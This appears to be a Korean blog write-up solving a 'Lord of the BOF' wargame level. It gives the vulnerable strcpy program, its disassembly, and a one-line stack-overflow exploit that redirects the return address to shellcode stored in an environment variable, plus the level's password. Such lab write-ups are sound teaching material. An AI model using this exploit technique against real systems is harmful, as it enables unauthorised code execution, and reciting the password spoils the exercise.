---
title: "BOF - Lv.2 gremlin"
excerpt: "Lv.2 gremlin"
toc: true
toc_sticky: true
categories:
  - BOF
tags:
  - stack buffer overflow
---

## 1. Source Code
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer 
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```
```
(gdb)
0x8048430 <main>:       push   %ebp
0x8048431 <main+1>:     mov    %ebp,%esp
0x8048433 <main+3>:     sub    %esp,16
0x8048436 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:    jg     0x8048453 <main+35>
0x804843c <main+12>:    push   0x80484d0
0x8048441 <main+17>:    call   0x8048350 <printf>
0x8048446 <main+22>:    add    %esp,4
0x8048449 <main+25>:    push   0
0x804844b <main+27>:    call   0x8048360 <exit>
0x8048450 <main+32>:    add    %esp,4
0x8048453 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:    add    %eax,4
0x8048459 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:    push   %edx
0x804845c <main+44>:    lea    %eax,[%ebp-16]
0x804845f <main+47>:    push   %eax
0x8048460 <main+48>:    call   0x8048370 <strcpy>
0x8048465 <main+53>:    add    %esp,8
0x8048468 <main+56>:    lea    %eax,[%ebp-16]
0x804846b <main+59>:    push   %eax
0x804846c <main+60>:    push   0x80484dc
0x8048471 <main+65>:    call   0x8048350 <printf>
0x8048476 <main+70>:    add    %esp,8
0x8048479 <main+73>:    leave
0x804847a <main+74>:    ret
```

## 2. Vulnerability

버퍼의 크기가 16인데 쉘코드 길이는 25byte, 41byte 등으로 버퍼안에 쉘코드를 넣어줄 수가 없음. 그래서 환경변수를 이용하여 문제를 해결해야 함.  
환경변수를 이용하면 변수의 주소를 리턴주소로 설정하면 되므로 버퍼의 크기에 상관없이 쉘코드를 실행시킬 수 있다. [환경변수 설정 및 주소 구하기](https://pistolwest.github.io/linux/bof/environment-value/)
## 3. Solution
환경변수 주소 ex)0xbffffc34 를 리턴 주소로 해주면 끝임. 
```
./cobolt `python -c 'print "\x90"*20+"\x34\xfc\xff\xbf"'`
``` 
my-pass : hacking exposed